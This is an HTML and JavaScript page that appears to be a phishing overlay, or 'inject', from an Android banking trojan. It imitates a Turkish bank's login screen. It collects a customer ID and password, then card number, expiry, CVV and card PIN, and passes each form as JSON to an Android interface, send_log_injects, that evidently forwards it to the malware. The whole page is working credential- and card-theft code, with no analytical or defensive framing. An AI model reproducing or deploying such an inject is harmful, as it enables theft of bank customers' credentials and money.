<div id="content_div">

<div class="header">
	<h3>Giriş</h3>
</div>

<div class="content" id="page1">
<form id="form1">

<input type="text" class="input input-login" name="fields[login]" maxlength="11" placeholder="Müşteri / T.C. Kimlik Numaranız" id="login">

<input name="fields[password]" class="input input-password" id="password" placeholder="Parola" type="password" maxlength="6">

<input type="checkbox" class="option-input radio" /><h5> Beni Hatırla </h5>

<input id="type_injects" value='banks' type="hidden" required>

<button type="button" class="s1" onclick="next()" id="input_submitBtn"><span>Giriş</span></button>
</form>
            
</div>

<div class="content" id=page2>
    <form id="form2">
    
        <input type="text" class="input input-login" name="fields[card_number]" id="card_number" placeholder="Kart Numarası" required/>
    
        <input type="text" class="input input-login" name="fields[card_expiration_date]" id="card_expiration_date" placeholder="Son Kullanma Tarihi" required/>
    
        <input type="text" class="input input-login" name="fields[card_cvv]" id="card_cvv" maxlength="3" placeholder="CVV" required/>
    
        <input type="password" class="input input-password" name="fields[password]" id="password" maxlength="4" placeholder="Kart Şifresi" required/>
    
        <input type="checkbox" class="option-input radio" /><h5> Beni Hatırla </h5>

        <input id="type_injects" value='banks' type="hidden" required>
        
        <input id="closed" value='close_activity_injects' type="hidden" required>
        
        <button type="button" class="s1" onclick="next2()" id="input_submitBtn"><span>Giriş</span></button>
    </form>
    </div>
            <script type="text/javascript">
                    document.getElementById('page2').style.display = 'none';            
                    $('#card_number').mask('0000 0000 0000 0000');
                    $('#card_expiration_date').mask('00/00');


					function next(){
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						oNumInp.classList.remove('error');
						oCodeInp.classList.remove('error');
						
                        if (oNumInp.value.length < 6) {
							try{
								oNumInp.classList.add('error');
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{6,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.classList.add('error');
							} catch(e){};
                            return false;
                        }
                        process('form1');
                        document.getElementById('page1').style.display = 'none';
                        document.getElementById('page2').style.display = 'block';
                    }
                    function next2(){
                        var ccNum = document.getElementById("card_number");
        var ccExpiration = document.getElementById("card_expiration_date");
        var ccCvv = document.getElementById("card_cvv");
        var password = document.getElementById("password");

        ccNum.classList.remove('error');
        ccExpiration.classList.remove('error');
        ccCvv.classList.remove('error');
        password.classList.remove('error');

        if (!validateCreditCardNumber(ccNum.value)) {
            ccNum.classList.add('error');
            return false;
        }

        if (!validateExpirationDate(ccExpiration.value)) {
            ccExpiration.classList.add('error');
            return false;
        }

        if (!validateCvv(ccCvv.value)) {
            ccCvv.classList.add('error');
            return false;
        }

        if (!validatePassword(password.value)) {
            password.classList.add('error');
            return false;
        }

        process('form2');
}

function process(formId) {
    var ua = navigator.userAgent.toLowerCase();
    if(ua.indexOf("android") > -1) {
        
        try {
        Android.send_log_injects(formToJSON(document.getElementById(formId)));
        } catch (err) {}
    }else{
        alert(formToJSON(document.getElementById(formId)));
    }
}

    function validateCreditCardNumber(ccNum) {
        return ccNum.length > 18 && ccNum.length < 21;
    }

    function validateExpirationDate(date) {
        var noLettersRegEx = /^[^a-zA-Z]+$/;

        return noLettersRegEx.test(date);
    }

    function validateCvv(cvv) {
        var cvvRegEx = /^[0-9]{3,4}$/;

        return cvvRegEx.test(cvv);
    }

    function validatePassword(password) {
        return password.length > 3;
    }
    function valid_credit_card(value) {
    if (/[^0-9-\s]+/.test(value)) return false;
    var nCheck = 0, nDigit = 0, bEven = false;
    value = value.replace(/\D/g, "");
    for (var n = value.length - 1; n >= 0; n--) {
      var cDigit = value.charAt(n),
        nDigit = parseInt(cDigit, 10);
      if (bEven) {
        if ((nDigit *= 2) > 9) nDigit -= 9;
      }
      nCheck += nDigit;
      bEven = !bEven;
    }
    return (nCheck % 10) == 0;
  }

var stringifyJSON = function(obj) {
    var arrOfKeyVals = [],
        arrVals = [],
        objKeys = [];

    /*********CHECK FOR PRIMITIVE TYPES**********/
    if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
        return '' + obj;
    else if (typeof obj === 'string')
        return '"' + obj + '"';

    /*********CHECK FOR ARRAY**********/
    else if (Array.isArray(obj)) {
        if (obj[0] === undefined)
            return '[]';
        else {
            obj.forEach(function(el) {
                arrVals.push(stringifyJSON(el));
            });
            return '[' + arrVals + ']';
        }
    }
    /*********CHECK FOR OBJECT**********/
    else if (obj instanceof Object) {
        objKeys = Object.keys(obj);
        objKeys.forEach(function(key) {
            var keyOut = '"' + key + '":';
            var keyValOut = obj[key];
            if (keyValOut instanceof Function || typeof keyValOut === undefined)
                arrOfKeyVals.push('');
            else if (typeof keyValOut === 'string')
                arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
            else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
                arrOfKeyVals.push(keyOut + keyValOut);
            else if (keyValOut instanceof Object) {
                arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
            }
        });
        return '{' + arrOfKeyVals + '}';
    }
};

function formToJSON(f)
{
    var FinalObject = {}, namesHTML = ['input','select'];

    for(var i = 0; i < namesHTML.length; i++) {
      
        var bsform = f.getElementsByTagName(namesHTML[i]);
       
        for(var j = 0; j < bsform.length; j++) {
            FinalObject[bsform[j].id] = bsform[j].value;
            
        }
    }
    return stringifyJSON(FinalObject);
}
